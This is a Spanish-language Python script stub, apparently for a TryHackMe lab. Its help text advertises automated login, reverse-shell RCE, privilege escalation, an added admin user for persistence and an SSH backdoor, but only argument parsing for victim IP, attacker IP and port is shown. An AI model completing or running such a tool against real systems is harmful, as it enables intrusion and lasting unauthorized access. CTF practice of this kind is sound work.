#-------------------------------------------------------------------------------------------------------------

import argparse
import requests
import payload
import base64
import socket
import time
import threading
import os
import subprocess

#-------------------------------------------------------------------------------------------------------------

def main():


    parser = argparse.ArgumentParser(

        formatter_class=argparse.RawTextHelpFormatter,
        description = '''[+] Este script automatiza el proceso de:

    [-] Login (manteniendo la sesion)
    [-] Ejecucion de RCE (Reverse Shell)
    [-] Escalada de privilegios
    [-] Persistencia (Usuario con permisos de administrador)
    [-] Creacion de Backdoor SSH (Conexion automatica)''',

        epilog = '''[+] Ejemplos de uso:

    [-] Definiendo IP Objetivo | IP Atacante | Puerto -- > python script.py -t 192.168.60.23 -l 127.0.0.1 -p 4444
    [-] Solo definiendo IPs --> python script.py -t 192.168.43.21 -l 127.0.0.1'''

    )

    parser.add_argument('-t', '--target', required = True,
    help = '[Requerido] IP de la maquina victima')
    parser.add_argument('-l', '--lhost', required = True,
    help = '[Requerido] IP de atacante (VPN -> THM)')
    parser.add_argument('-p', '--lport', type = int, default = 4444,
    help = '[Opcional] Puerto a la escucha (Por defecto: 4444)')
    parser.add_argument('-v', '--verbose', action = 'store_true',
    help = '[Opcional] Muestra el proceso detallado')

    args =  parser.parse_args()

    print('=' * 50)
    print(f'''[+] Valores definidos:
    [-] IP Victima: {args.target}
    [-] IP Atacante: {args.lhost}
    [-] Puerto a la escucha: {args.lport}''')
    print('=' * 50)

#-------------------------------------------------------------------------------------------------------------

if __name__ == '__main__':
    main()
